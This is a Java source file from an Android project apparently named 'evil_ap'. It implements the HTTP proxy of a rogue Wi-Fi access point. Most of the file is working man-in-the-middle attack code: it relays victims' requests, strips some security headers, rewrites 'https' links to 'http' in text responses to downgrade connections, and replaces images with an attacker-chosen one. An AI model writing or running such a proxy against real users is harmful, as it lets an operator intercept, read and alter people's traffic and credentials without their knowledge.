package com.nibiru.evil_ap.proxy;

import android.content.SharedPreferences;
import android.util.Log;

import java.io.BufferedReader;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.io.UnsupportedEncodingException;
import java.net.Socket;

import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;

/**
 * Created by Nibiru on 2016-11-25.
 */

public class ThreadProxy implements Runnable{
    /**************************************CLASS FIELDS********************************************/
    protected final String TAG = getClass().getSimpleName();
    private Socket sClient;
    private OkHttpParser rp;
    private OkHttpClient okhttp;
    private InputStream imgSwap;
    private SharedPreferences mConfig;
    private boolean debug = true;
    /**************************************CLASS METHODS*******************************************/
    ThreadProxy(Socket sClient, InputStream img, SharedPreferences config) {
        this.sClient = sClient;
        rp = new OkHttpParser();
        okhttp = new OkHttpClient();
        imgSwap = img;
        mConfig = config;
    }
    @Override
    public void run() {
        //things we will eventually close
        BufferedReader inFromClient = null;
        InputStream inFromServer = null;
        OutputStream outToClient = null;
        Response res = null;
        try {
            inFromClient = new BufferedReader(new InputStreamReader(sClient.getInputStream()));
            outToClient = sClient.getOutputStream();

            //get client request string
            String sRequest = getRequestString(inFromClient);
            if (sRequest == null) {return;}

            //parse string request into okhttp request (remove some security headers)
            Request req = rp.parse(sRequest);
            if (req == null) {return;}

            //make request and get response
            res = okhttp.newCall(req).execute();

            //prepare response
            byte[] bytesBody = res.body().bytes();
            //check what we are sending back
            String contentType = res.header("Content-Type");

            //EDIT RESPONSE HERE (SSL STRIP)
            if(mConfig.getBoolean("sslStrip", false) && contentType != null &&
                    contentType.contains("text"))
                bytesBody = sslStrip(bytesBody);
            //prepare proper length response headers
            String headers = getResponseHeaders(res, bytesBody.length, getEtag(sRequest));
            headers = headers.replaceAll("\\n", "\r\n");

            ByteArrayOutputStream streamResponse = new ByteArrayOutputStream();
            //if we are sending back image then swap bytes
            if (imgSwap != null && contentType != null && contentType.contains("image")){
                //update content length
                headers = headers.replaceAll("Content-Length:.*", "Content-Length: " +
                        imgSwap.available());
                //add header bytes to stream
                streamResponse.write(headers.getBytes());
                //add swapped image bytes to stream
                int nRead;
                byte[] data = new byte[8192];
                while ((nRead = imgSwap.read(data, 0, data.length)) != -1) {
                    streamResponse.write(data, 0, nRead);
                }
            }
            else {
                streamResponse.write(headers.getBytes());
                streamResponse.write(bytesBody);
            }

            //send to client
            if (debug) Log.d(TAG + "[OUT]", headers);
            inFromServer = new ByteArrayInputStream(streamResponse.toByteArray());
            sendInStreamToOutStream(inFromServer, outToClient);

        } catch (IOException e) {
            e.printStackTrace();
        } finally {
            //clean up
            if (res != null) res.body().close();
             try {
                 if (imgSwap != null)imgSwap.close();
                 if (outToClient != null) outToClient.close();
                 if (inFromServer != null) inFromServer.close();
                 if (sClient != null) sClient.close();
             }
             catch (IOException e) {
                 e.printStackTrace();
             }
        }
    }

    private byte[] sslStrip(byte[] bytesBody) {
        try {
            String response = new String(bytesBody, "UTF-8");
            response = response.replaceAll("https", "http");
            return response.getBytes();
        } catch (UnsupportedEncodingException e) {
            e.printStackTrace();
            return null;
        }
    }

    // convert InputStream to String
    private static String getStringFromInputStream(InputStream is) {

        BufferedReader br = null;
        StringBuilder sb = new StringBuilder();

        String line;
        try {

            br = new BufferedReader(new InputStreamReader(is));
            while ((line = br.readLine()) != null) {
                sb.append(line);
            }

        } catch (IOException e) {
            e.printStackTrace();
        } finally {
            if (br != null) {
                try {
                    br.close();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        }

        return sb.toString();

    }

    private void sendInStreamToOutStream(InputStream in, OutputStream out){
        byte[] reply = new byte[4096];
        int bytes_read;
        try {
            while ((bytes_read = in.read(reply)) != -1) {
                out.write(reply, 0, bytes_read);
                out.flush();
                //TODO CREATE YOUR LOGIC HERE
            }
            if (debug) Log.d(TAG + "[OUT]", "sent entire body!");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    private String getEtag(String sRequest){
        String result = "";
        if (sRequest.contains("\"")) {
            result = sRequest.substring(sRequest.indexOf("\"") + 1);
            result = result.substring(0, result.indexOf("\""));
        }
        return "\"" + result + "\"";
    }

    private String getResponseHeaders(Response res, int len, String eTag) throws IOException {
        String resToClient = "";
        if (debug) Log.d(TAG, "<==================Sending response==================>");
        //find status line
        switch (res.code()) {
            case 200: resToClient += "HTTP/1.1 200 OK\n"; break;
            case 204: resToClient += "HTTP/1.1 204 No Content\n"; break;
            case 304: resToClient += "HTTP/1.1 304 Not Modified\n"; break;
            case 403: resToClient += "HTTP/1.1 403 Forbidden\n"; break;
            case 404: resToClient += "HTTP/1.1 404 Not Found\n"; break;
            default: Log.e(TAG, "UNKNOWN STATUS CODE = " + res.code());
        }
        //send headers
        resToClient += res.headers().toString() + "\n";
        //workaround for okhttp transparent gzip
        resToClient = resToClient.replace("Transfer-Encoding: chunked",
                "Content-Length: " + len);
        //workaround for 304 not working
        if (resToClient.startsWith("HTTP/1.1 304")) {
            resToClient = resToClient.replace("Connection: keep-alive", "Connection: close");
            resToClient = resToClient.replaceAll("ETag:.*", "ETag: " + eTag);
        }
        return resToClient;
    }

    private String getRequestString(BufferedReader in) throws IOException {
        String request = "";
        String body = "";
        String line;
        int length = 0;
        //read string request until there are no lines to read
        while ((line = in.readLine()) != null) {
            //last line of request message header is a blank line (\r\n\r\n)
            if (line.isEmpty()) {
                break;
            }
            //TODO: implement POST
            if (line.startsWith("POST")) {
                Log.e(TAG, "DROPPED POST REQUEST!");
                return null;
            }
            if (line.startsWith("Content-Length")) { //get the content-length
                int index = line.indexOf(':') + 1;
                String len = line.substring(index).trim();
                length = Integer.parseInt(len);
            }
            if (line.startsWith("Accept-Encoding")) { //make sure content is not zipped...
                continue;
                /*Log.d(TAG + "[IN]", "Accept-Encoding: identity");
                request += "Accept-Encoding: identity\r\n";*/
            }
            else {
                if (debug) Log.d(TAG + "[IN]", line);
                request += line + "\r\n";
            }
        }
        // if there is Message body, go in to this loop
        if (length > 0) {
            int read;
            while ((read = in.read()) != -1) {
                body += ((char) read);
                if (body.length() == length) break;
            }
        }
        request += body; // adding the body to request
        return request;
    }

}
